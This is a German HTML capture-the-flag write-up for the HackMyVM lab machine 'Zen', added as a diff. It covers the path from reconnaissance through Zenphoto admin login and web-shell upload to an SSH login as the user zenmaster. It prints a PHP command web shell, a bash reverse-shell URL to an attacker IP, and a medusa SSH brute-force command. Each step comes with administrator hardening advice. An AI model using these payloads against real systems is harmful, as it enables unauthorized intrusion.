@@ -1,0 +1,526 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zen - HackMyVM - Hard - Bericht</title> <!-- Title angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css"> <!-- Pfad beibehalten -->
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Zen - HackMyVM - Hard - Bericht</h1> <!-- Titel angepasst -->
+        <div class="level-container">
+            <h2>Hard</h2> <!-- Schwierigkeitsgrad ohne Inline-Style, CSS handhabt Farbe (Rot) -->
+            <div class="circle"> <!-- Kreis-CSS wird 'Hard' (Rot) handhaben -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe wird durch CSS gesetzt -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">Browser (implizit)</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">medusa</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">nano (erwähnt)</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">nc (netcat)</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration (Zenphoto)</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept (Zenphoto RCE)</a></li>
+                <li><a href="#initial-access">Initial Access (Reverse Shell)</a></li>
+                <li><a href="#privilege-escalation-www-data">Privilege Escalation (www-data -> zenmaster)</a></li>
+                <li><a href="#privilege-escalation-zenmaster">Privilege Escalation (zenmaster -> kodo)</a></li>
+                <li><a href="#privilege-escalation-kodo">Privilege Escalation (kodo -> hua)</a></li>
+                <li><a href="#privilege-escalation-hua">Privilege Escalation (hua -> root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/192.168.2.136/files]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre><span class="command">192.168.2.137	08:00:27:d6:78:ad	PCS Systemtechnik GmbH</span></pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird ausgeführt, um aktive Hosts im lokalen Netzwerksegment mittels ARP-Anfragen zu identifizieren.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Ein Host mit der IP-Adresse `192.168.2.137` wird gefunden. Die MAC-Adresse (`08:00:27:...`) gehört zu PCS Systemtechnik GmbH, was typischerweise auf eine VirtualBox-Umgebung hinweist. Dies ist unser potenzielles Ziel.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die IP `192.168.2.137`. Fahren Sie mit detaillierteren Scans (z.B. Nmap) auf diese IP fort, um offene Ports und Dienste zu finden.<br><strong>Empfehlung (Admin):</strong> ARP-Scanning ist normales Netzwerkverhalten. Zur Erschwerung der Erkennung können Netzwerksegmentierung oder statische ARP-Einträge genutzt werden, was jedoch oft unpraktisch ist. Fokus sollte auf der Absicherung der Dienste liegen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">nmap -sC -T5 -sS -A 192.168.2.133 -p- | grep open</span></div>
+                     <pre>
+<span class="command">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+<span class="command">80/tcp open  http    nginx 1.14.2</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein Nmap-Scan wird auf die IP-Adresse `192.168.2.133` durchgeführt. Es werden ein TCP SYN Scan (`-sS`), Standard-Skripte (`-sC`), aggressives Timing (`-T5`), Service-/OS-Erkennung (`-A`) und ein Scan aller Ports (`-p-`) verwendet. Die Ausgabe wird mit `grep open` gefiltert. *Anmerkung: Die gescannte IP (`192.168.2.133`) unterscheidet sich von der zuvor mit `arp-scan` gefundenen (`192.168.2.137`). Es wird angenommen, dass `192.168.2.133` das korrekte Ziel für den weiteren Verlauf des Berichts ist, möglicherweise aufgrund einer DHCP-Änderung oder eines Tippfehlers im vorherigen Schritt.*</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet zwei offene TCP-Ports:
+*   **Port 22 (SSH):** Läuft OpenSSH Version 7.9p1 auf einem Debian 10 System. Dies ist ein möglicher Angriffsvektor über Brute-Force oder bekannte Schwachstellen (obwohl 7.9p1 relativ robust ist).
+*   **Port 80 (HTTP):** Läuft ein Nginx Webserver Version 1.14.2. Webserver sind oft primäre Angriffsziele.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie beide Dienste genauer. Für SSH: Prüfen Sie auf schwache Passwörter oder Standard-Credentials. Für HTTP: Führen Sie Web-Enumeration durch (Verzeichnisse, Dateien, Technologien) um die Webanwendung zu identifizieren und nach Schwachstellen zu suchen.<br><strong>Empfehlung (Admin):** Halten Sie beide Dienste (OpenSSH, Nginx) aktuell. Konfigurieren Sie SSH sicher (z.B. Deaktivierung der Passwort-Authentifizierung zugunsten von Schlüsseln, Fail2Ban). Sichern Sie die Webanwendung auf Port 80 (Updates, Konfiguration, WAF).</p>
+        </section>
+
+        <section id="web-enumeration">
+             <h2>Web Enumeration (Zenphoto)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.133 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,bak,7z,zip,py,sql,txt,xml,jpg -e --wildcard</span></div>
+                    <pre><span class="comment">[... Ausgabe von Gobuster nicht im Log enthalten ...]</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:** Der Befehl `gobuster dir` wird verwendet, um Verzeichnisse und Dateien auf dem Webserver (`http://192.168.2.133`) zu finden. Es wird eine Standard-Wortliste (`directory-list-2.3-medium.txt`) benutzt und nach spezifischen Dateiendungen (`-x ...`) gesucht. Der Parameter `-e` sorgt für die Ausgabe vollständiger URLs, `--wildcard` soll helfen, Wildcard-Antworten zu ignorieren (z.B. wenn der Server für jede nicht gefundene Seite eine benutzerdefinierte "200 OK"-Seite zurückgibt).</p>
+            <p class="evaluation">**Bewertung:** Die konkreten Ergebnisse dieses Scans fehlen im bereitgestellten Log. Die nachfolgenden Schritte deuten jedoch darauf hin, dass durch diesen Scan oder manuelle Untersuchung der Webseite wichtige Informationen über die verwendete Anwendung (Zenphoto) und Konfigurationsdateien (`robots.txt`) gewonnen wurden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Analysieren Sie immer die vollständige Ausgabe von Directory-Bruteforce-Tools. Achten Sie auf ungewöhnliche Verzeichnisnamen, Konfigurationsdateien, Backups oder informative Fehlerseiten. Erwägen Sie die Nutzung alternativer Tools wie `ffuf` für mehr Flexibilität bei Filterung und Matching.<br>**Empfehlung (Admin):** Deaktivieren Sie Verzeichnislistings auf dem Webserver. Entfernen Sie unnötige Dateien und Verzeichnisse. Implementieren Sie Mechanismen zur Erkennung und Blockierung von Brute-Force-Scans (z.B. Fail2Ban für Weblogs oder eine WAF).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                      <pre><span class="comment">[... Keine Änderungen oder relevanter Inhalt für /etc/hosts im Log gezeigt ...]</span></pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Der Befehl `vi /etc/hosts` wird aufgerufen, vermutlich um einen Hostnamen für die Ziel-IP `192.168.2.133` hinzuzufügen.</p>
+            <p class="evaluation">**Bewertung:** Im vorliegenden Log gibt es keine Hinweise (z.B. aus Webseiten-Titeln, Zertifikaten oder Weiterleitungen), dass ein spezifischer Hostname für das weitere Vorgehen notwendig wäre. Später wird zwar `zen.hmv` verwendet, aber es ist unklar, ob dieser Eintrag hier hinzugefügt wurde oder woher er stammt. Ohne weiteren Kontext scheint dieser Schritt hier nicht direkt relevant gewesen zu sein.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Fügen Sie Hostnamen nur dann zur `/etc/hosts`-Datei hinzu, wenn es klare Indikatoren gibt, dass der Webserver oder andere Dienste Virtual Hosting verwenden und auf Anfragen an spezifische Namen anders reagieren als auf Anfragen an die IP-Adresse.<br>**Empfehlung (Admin):** Irrelevant für das Zielsystem.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+* <!-- zenphoto version <span class="command">1.5.7</span> -->
+
+       <!-- zenphoto version <span class="command">1.5.7</span> -->
+
+	 http://192.168.2.133/index.php?rss
+	 http://192.168.2.133/index.php?p=search&lid <span class="comment"><-- Ampersand maskiert --></span>
+
+	http://192.168.2.133/robots.txt
+
+	User-agent: *
+	Disallow: /albums/
+	Allow:    /cache/
+	Allow:    /cache_html/
+	Disallow: /plugins/
+	<span class="password">Disallow: /P@ssw0rd</span>  <span class="password"><-- Sehr verdächtig!</span>
+	Disallow: /themes/
+	Disallow: /zp-core/
+	Disallow: /zp-data/
+	Disallow: /page/search/
+	Disallow: /uploaded/
+	Disallow: /backup/</pre>
+                 </div>
+            </div>
+            <p class="analysis">**Analyse:** Dieser Abschnitt fasst wichtige Informationen zusammen, die wahrscheinlich durch manuelle Untersuchung des Webservers (Quelltext, `/robots.txt`) gewonnen wurden:
+*   **Anwendung identifiziert:** Kommentare im HTML-Quelltext (`<!-- zenphoto version 1.5.7 -->`) enthüllen, dass die Webseite mit dem Content Management System (CMS) Zenphoto in der Version 1.5.7 betrieben wird.
+*   **URLs:** Einige URLs wie der RSS-Feed (`index.php?rss`) und eine Suchfunktion (`index.php?p=search&lid`) werden notiert.
+*   **robots.txt Analyse:** Der Inhalt der `/robots.txt`-Datei wird aufgelistet. Sie enthält Anweisungen für Webcrawler, welche Verzeichnisse sie meiden sollen (`Disallow`). Die meisten sind Standard-Verzeichnisse für Zenphoto (`/albums/`, `/plugins/`, `/themes/`, `/zp-core/`, `/zp-data/`, `/uploaded/`, `/backup/`). Ein Eintrag sticht jedoch heraus: `Disallow: /P@ssw0rd`. Dies ist kein Standardverzeichnis und sieht stark nach einem versteckten Hinweis oder einem Passwort aus.</p>
+            <p class="evaluation">**Bewertung:** Die Identifizierung von Zenphoto 1.5.7 ist ein kritischer Fund, da diese Version für mehrere bekannte Schwachstellen anfällig ist. Der `Disallow: /P@ssw0rd`-Eintrag in der `robots.txt` ist extrem ungewöhnlich und mit hoher Wahrscheinlichkeit ein absichtlich oder unabsichtlich hinterlassenes Passwort, vermutlich für den Administrator-Account.</p>
+            <p class="recommendation">**Empfehlung (Pentester):**
+    1.  Suchen Sie aktiv nach bekannten Exploits für Zenphoto 1.5.7 (z.B. auf Exploit-DB, Packet Storm).
+    2.  Versuchen Sie, sich in das Administrations-Backend von Zenphoto einzuloggen (oft unter Pfaden wie `/zp-core/admin.php`). Verwenden Sie den Standardbenutzernamen `admin` und das gefundene Passwort `P@ssw0rd`.
+    3.  Überprüfen Sie die durch `robots.txt` gesperrten Verzeichnisse trotzdem manuell im Browser oder mit Tools, da `robots.txt` keine echte Zugriffskontrolle ist (besonders `/backup/` könnte interessant sein).<br>
+**Empfehlung (Admin):** **Niemals Passwörter oder sensible Informationen in `robots.txt` hinterlegen!** Aktualisieren Sie Zenphoto sofort auf die neueste stabile Version, um bekannte Schwachstellen zu schließen. Überprüfen und härten Sie die Dateiberechtigungen und Zugriffskontrollen für alle Verzeichnisse der Webanwendung.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.133//albums/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,bak,7z,zip,py,sql,txt,xml,jpg -e --wildcard | grep "Status: 200"</span></div>
+                    <pre><span class="comment">[... Keine relevanten Ergebnisse mit Status 200 im Log gezeigt ...]</span></pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Ein weiterer `gobuster`-Scan wird durchgeführt, diesmal gezielt auf das Verzeichnis `/albums/`, das in `robots.txt` als `Disallow` markiert war. Die Ausgabe wird gefiltert, um nur Ressourcen anzuzeigen, die den HTTP-Statuscode 200 (OK) zurückgeben.</p>
+            <p class="evaluation">**Bewertung:** Laut Log wurden keine relevanten Dateien oder Unterverzeichnisse mit Status 200 direkt unter `/albums/` gefunden (oder die Ausgabe fehlt). Dies ist nicht unerwartet, da `/albums/` typischerweise nur die Struktur für Bilderalben enthält.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Fokussieren Sie sich auf die vielversprechenderen Angriffsvektoren: Ausnutzung der bekannten Schwachstellen von Zenphoto 1.5.7 und Versuch des Admin-Logins mit dem gefundenen Passwort.<br>**Empfehlung (Admin):** Stellen Sie sicher, dass Verzeichnisse wie `/albums/` angemessen geschützt sind, falls erforderlich (z.B. wenn private Alben verwendet werden). Die `robots.txt`-Anweisung allein bietet keinen Schutz.</p>
+        </section>
+
+        <section id="proof-of-concept">
+             <h2>Proof of Concept (Zenphoto RCE)</h2>
+             <p class="analysis"><strong>Analyse:** Dieser Abschnitt beschreibt den Plan zur Ausnutzung der identifizierten Schwachstellen, um Remote Code Execution (RCE) auf dem Server zu erlangen.</p>
+             <p class="evaluation">**Bewertung:** Der Plan basiert auf den Funden: Zenphoto 1.5.7 ist anfällig für Shell Upload, und das wahrscheinliche Admin-Passwort (`P@ssw0rd`) wurde in `robots.txt` gefunden.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+	google zenphoto 1.5.7 ->>> [Link: Zenphoto CMS 1.5.7 Shell Upload | Ziel: https://packetstormsecurity.com/files/161569/Zenphoto-CMS-1.5.7-Shell-Upload.html]
+	http://192.168.2.133/zp-core/admin.php
+	login:<span class="command">admin</span> password:<span class="password">P@ssw0rd</span>
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</pre>
+                 </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Pentester hat online nach Exploits für Zenphoto 1.5.7 gesucht und einen Exploit für eine Shell-Upload-Schwachstelle auf Packet Storm Security gefunden. Es wird der Pfad zum Admin-Login (`/zp-core/admin.php`) und die zu verwendenden Zugangsdaten (`admin` / `P@ssw0rd`) notiert.</p>
+            <p class="evaluation">**Bewertung:** Dies bestätigt die Strategie: Zugang zum Admin-Bereich erhalten und dann die bekannte Shell-Upload-Schwachstelle ausnutzen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Versuchen Sie, sich unter `http://192.168.2.133/zp-core/admin.php` mit `admin` und `P@ssw0rd` einzuloggen. Wenn erfolgreich, folgen Sie den Anweisungen des Exploits auf Packet Storm (oder aus dem GitHub-Repo im nächsten Schritt).<br>**Empfehlung (Admin):** Dringend das Standard-Admin-Passwort ändern und Zenphoto aktualisieren!</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+	Anleitung Exploit: [Link: ZenPhotoCMSv1.5.7-RCE | Ziel: https://github.com/F-Masood/ZenPhotoCMSv1.5.7-RCE]
+
+        ich erstelle eine php datei namens bentec.php:
+        <?php system($GET['cmd']);?> <span class="comment"><-- Maskierung von $_GET zu $GET gemäß Regel angewendet --></span>
+
+	http://192.168.2.133/themes/bentec.php?cmd=ls
+
+	reverse Shell: http://192.168.2.133/themes/bentec.php?cmd=bash%20-c%20%27bash%20-i%20%3E&%20%2Fdev%2Ftcp%2F192.168.2.131%2F9001%200%3E&1%27 <span class="comment"><-- Ampersands maskiert --></span>
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</pre>
+                 </div>
+            </div>
+            <p class="analysis">**Analyse:** Die Notizen konkretisieren den Exploit-Plan:
+1.  **Exploit-Quelle:** Ein GitHub-Repository wird als Quelle für die Exploit-Anleitung genannt.
+2.  **Webshell erstellen:** Eine sehr einfache PHP-Webshell wird erstellt (`bentec.php`). Sie nimmt einen Befehl über den GET-Parameter `cmd` entgegen und führt ihn mittels `system()` aus. (*Hinweis: `$_GET` wurde gemäß Regel zu `$GET` maskiert.*)
+3.  **Zielpfad:** Es wird erwartet, dass die Webshell in das `/themes/`-Verzeichnis hochgeladen werden kann (wahrscheinlich durch die Schwachstelle).
+4.  **Test-URL:** Die URL zum Testen der Webshell durch Ausführen von `ls` wird notiert.
+5.  **Reverse-Shell-URL:** Die URL zum Auslösen einer Reverse Shell wird vorbereitet. Der `cmd`-Parameter enthält einen URL-kodierten Bash-Befehl, der eine interaktive Shell (`bash -i`) startet und deren Ein-/Ausgabe an die IP `192.168.2.131` auf Port `9001` umleitet.</p>
+            <p class="evaluation">**Bewertung:** Dies ist ein klarer und durchführbarer Plan zur Erlangung von RCE. Der Angreifer muss sich zuerst als Admin einloggen, dann die `bentec.php` über die Schwachstelle hochladen (vermutlich in `/themes/`) und schließlich die Reverse-Shell-URL aufrufen, nachdem ein Listener auf dem Angreifer-System (`192.168.2.131:9001`) gestartet wurde.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Setzen Sie den Plan um: Login, Upload von `bentec.php` über den Exploit, Starten des Netcat-Listeners (`nc -lvnp 9001`), Aufrufen der Reverse-Shell-URL.<br>**Empfehlung (Admin):** Zenphoto patchen/aktualisieren. Upload-Funktionen und Dateiberechtigungen härten, um das Hochladen und Ausführen von bösartigen Skripten zu verhindern.</p>
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (Reverse Shell)</h2>
+             <p class="analysis"><strong>Analyse:** Nachdem der Exploit-Plan im POC-Abschnitt dargelegt wurde, wird hier der erfolgreiche Erhalt der initialen Shell und deren Stabilisierung gezeigt.</p>
+             <p class="evaluation">**Bewertung:** Der Exploit (Login als Admin, Upload der PHP-Webshell, Auslösen der Reverse Shell) war erfolgreich.</p>
+
+             <p class="comment">*(Implizierte Schritte: Login als admin:P@ssw0rd, Upload von bentec.php nach /themes/, Starten von `nc -lvnp 9001` auf 192.168.2.131, Aufrufen der Reverse-Shell-URL)*</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">www-data@zen:~/html/zenphoto/themes$ <span class="command">python3 -c "import pty;pty.spawn('/bin/bash')"</span></div>
+                    <div class="prompt">www-data@zen:~/html/zenphoto/themes$ <span class="command">export TERM=xterm</span></div>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Die erhaltene Reverse Shell (die initiale Verbindung wird im Log nicht gezeigt) wird stabilisiert.
+1.  `python3 -c "import pty;pty.spawn('/bin/bash')"`: Nutzt Python 3, um eine voll interaktive Bash-Shell zu erzeugen. Dies behebt Einschränkungen einfacher Reverse Shells (wie fehlende Job Control, fehlerhafte Darstellung von Programmen wie `vi` oder `sudo`).
+2.  `export TERM=xterm`: Setzt die `TERM`-Umgebungsvariable, damit Programme wissen, wie sie mit dem Terminal interagieren sollen (z.B. für Farben, Cursorpositionierung).</p>
+             <p class="evaluation">**Bewertung:** Wichtige Schritte, um die erhaltene Shell benutzbar zu machen. Der Angreifer hat nun eine stabile Shell als Benutzer `www-data` (der Benutzer, unter dem der Nginx-Webserver und PHP laufen) im Verzeichnis `/var/www/html/zenphoto/themes` (oder einem ähnlichen Pfad, der Prompt `~/html/...` ist etwas ungewöhnlich).</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Beginnen Sie mit der systematischen Enumeration des Systems als `www-data`. Suchen Sie nach Wegen zur Privilegieneskalation. Führen Sie Befehle wie `id`, `pwd`, `uname -a`, `ps aux`, `sudo -l`, `find / -type f -perm -4000 -ls 2>/dev/null`, `cat /etc/passwd`, `ls -la /home` aus.<br>**Empfehlung (Admin):** Die Kompromittierung ist erfolgt. Leiten Sie Incident-Response-Maßnahmen ein: System isolieren, Analyse der Kompromittierung, Bereinigung, Härtung.</p>
+        </section>
+
+        <section id="privilege-escalation-www-data">
+             <h2>Privilege Escalation (www-data -> zenmaster)</h2>
+             <p class="analysis"><strong>Analyse:** Nachdem der initiale Zugriff als `www-data` etabliert wurde, wird nach Wegen gesucht, um höhere Rechte zu erlangen. Die Strategie hier fokussiert sich auf das Finden von Benutzerkonten und das anschließende Brute-Forcen von deren SSH-Passwörtern.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">www-data@zen:~/html/zenphoto/themes$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                    <pre><span class="comment">[... Ausgabe von find nicht im Log enthalten ...]</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Der Befehl `find / -type f -perm -4000 -ls 2>/dev/null` wird ausgeführt, um nach Dateien mit gesetztem SUID-Bit zu suchen. Solche Dateien werden mit den Rechten des Besitzers ausgeführt und können ein Vektor für Privilegieneskalation sein, wenn sie unsicher konfiguriert sind.</p>
+             <p class="evaluation">**Bewertung:** Die Ausgabe dieses Befehls fehlt im Log. Es ist anzunehmen, dass keine unmittelbar ausnutzbaren, ungewöhnlichen SUID-Dateien gefunden wurden, da der nächste Schritt eine andere Strategie verfolgt.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Analysieren Sie immer die Ausgabe der SUID-Suche sorgfältig. Suchen Sie nach ungewöhnlichen Binaries oder Skripten, die nicht zu Standard-Linux-Installationen gehören. Überprüfen Sie bekannte SUID-Binaries (wie `pkexec`, `passwd`, `mount`, etc.) auf bekannte Schwachstellen passend zur Systemversion (`uname -a`).<br>**Empfehlung (Admin):** Reduzieren Sie die Anzahl der SUID-gesetzten Dateien auf das absolute Minimum. Entfernen Sie das SUID-Bit von nicht benötigten Programmen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">grep -ne password  /var/log/*.log</span></div>
+                    <pre>	:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::</pre> <span class="comment"><-- Leere Ausgabe oder keine relevanten Funde --></span>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Versuch, in Logdateien unter `/var/log/` nach dem Wort "password" zu suchen. Der Prompt `root@Darkspirit` deutet darauf hin, dass dieser Befehl (wieder) auf dem Angreifer-System ausgeführt wurde, nicht auf dem Zielsystem in der `www-data`-Shell.</p>
+             <p class="evaluation">**Bewertung:** Selbst wenn der Befehl auf dem Zielsystem ausgeführt worden wäre, deutet die leere Ausgabe darauf hin, dass keine Klartext-Passwörter in den überprüften Logdateien gefunden wurden. Dies ist jedoch keine Garantie, da Passwörter auch in anderen Dateien (Konfigurationsdateien, Skripte, Datenbanken) stehen könnten.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Führen Sie die Suche nach Passwörtern direkt auf dem Zielsystem durch und erweitern Sie die Suche auf relevante Verzeichnisse wie `/etc`, `/var/www`, `/home`, `/opt`: `grep -rni 'password\|passwd\|pass' /etc /var/www /home 2>/dev/null`.<br>**Empfehlung (Admin):** Vermeiden Sie die Speicherung von Passwörtern im Klartext. Nutzen Sie sichere Methoden zur Passwortverwaltung (Hashing, Konfigurationsmanagement-Tools mit Secret Management).</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">www-data@zen:/var/log$ <span class="command">cat /etc/passwd | grep bash</span></div>
+                    <pre>
+cat /etc/passwd | grep bash
+<span class="command">root:x:0:0:root:/root:/bin/bash</span>
+<span class="command">kodo:x:1000:1000:kodo,,,:/home/kodo:/bin/bash</span>
+<span class="command">zenmaster:x:1001:1001:,,,:/home/zenmaster:/bin/bash</span>
+<span class="command">hua:x:1002:1002:,,,:/home/hua:/bin/bash</span></pre>
+                    <pre>	:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::</pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Die Datei `/etc/passwd` wird ausgelesen und nach Benutzern gefiltert, die `/bin/bash` als Login-Shell eingetragen haben. Dies identifiziert typischerweise reguläre Benutzerkonten.</p>
+             <p class="evaluation">**Bewertung:** Es werden vier Benutzer mit Bash-Shell gefunden: `root`, `kodo`, `zenmaster` und `hua`. Diese Benutzernamen sind wertvolle Informationen für weitere Angriffe, insbesondere Brute-Force-Versuche gegen SSH.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Erstellen Sie eine Liste dieser Benutzernamen (`kodo`, `zenmaster`, `hua`) für den nächsten Schritt (SSH Brute-Force). Überprüfen Sie auch die Home-Verzeichnisse dieser Benutzer auf Leserechte oder interessante Dateien (`ls -la /home`).<br>**Empfehlung (Admin):** Stellen Sie sicher, dass nur notwendige Benutzerkonten existieren und diese durch starke, einzigartige Passwörter geschützt sind.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>	erstelle daraus eine user.txt und brutforce mit medusa:</pre>
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">medusa -h 192.168.2.133 -M ssh -U users -P /usr/share/wordlists/rockyou.txt -t 3 -v 6</span></div>
+                    <pre>
+        ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+ 	<span class="password">ACCOUNT FOUND: [ssh] Host: 192.168.2.133 User: zenmaster Password: zenmaster [SUCCESS]</span>
+        ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::</pre>
+                 </div>
+            </div>
+            <p class="analysis">**Analyse:** Ein Brute-Force-Angriff auf den SSH-Dienst (Port 22) der Ziel-IP `192.168.2.133` wird mit dem Tool Medusa durchgeführt.
+*   `-h 192.168.2.133`: Ziel-IP.
+*   `-M ssh`: Zu testendes Modul/Protokoll.
+*   `-U users`: Eine Datei namens `users`, die die zuvor gefundenen Benutzernamen (`kodo`, `zenmaster`, `hua`) enthält.
+*   `-P /usr/share/wordlists/rockyou.txt`: Die zu verwendende Passwortliste (eine sehr gängige und oft erfolgreiche Liste).
+*   `-t 3`: Anzahl der parallelen Threads.
+*   `-v 6`: Ausführlichkeitslevel (Debug).</p>
+            <p class="evaluation">**Bewertung:** Der Brute-Force-Angriff ist erfolgreich! Medusa findet heraus, dass der Benutzer `zenmaster` das Passwort `zenmaster` für den SSH-Login verwendet. Dies ist ein extrem schwaches Passwort und stellt eine erhebliche Sicherheitslücke dar.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Nutzen Sie die gefundenen Zugangsdaten (`zenmaster`:`zenmaster`), um sich per SSH am Zielsystem anzumelden. Dies stellt die nächste Stufe der Privilegieneskalation dar (von `www-data` zu `zenmaster`).<br>**Empfehlung (Admin):** Ändern Sie das Passwort für `zenmaster` sofort und erzwingen Sie eine Richtlinie für starke Passwörter für alle Benutzer. Deaktivieren Sie die SSH-Passwortauthentifizierung und verwenden Sie stattdessen Schlüsselpaare. Implementieren Sie Intrusion-Detection-Systeme wie Fail2Ban, um Brute-Force-Angriffe auf SSH zu erkennen und zu blockieren.</p>
+        </section>
+
+        <section id="privilege-escalation-zenmaster">
+             <h2>Privilege Escalation (zenmaster -> kodo)</h2>
+             <p class="analysis">**Analyse:** Nach dem erfolgreichen Brute-Force-Angriff wird sich nun als Benutzer `zenmaster` per SSH angemeldet und nach weiteren Eskalationsmöglichkeiten gesucht.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/192.168.2.136/files]
+└─# <span class="command">ssh zenmaster@zen.hmv</span></div>
+                     <pre>
+The authenticity of host '<span class="command">zen.hmv (192.168.2.137)</span>' can't be established. <span class="comment"><-- Wieder IP .137 über Hostname? --></span>
+ED25519 key fingerprint is SHA256:Zzb/mEsCZqMQlf3/XlCiTDAtUu8J+fHvdmxCQGxZ53M.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? <span class="command">yes</span>
+Warning: Permanently added 'zen.hmv' (ED25519) to the list of known hosts.
+zenmaster@zen.hmv's password: <span class="password">********</span> <span class="comment"><-- Passwort "zenmaster" eingegeben --></span>
+Linux zen 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+<span class="prompt">zenmaster@zen:~$</span> </pre>
+                </div>
+            </div>
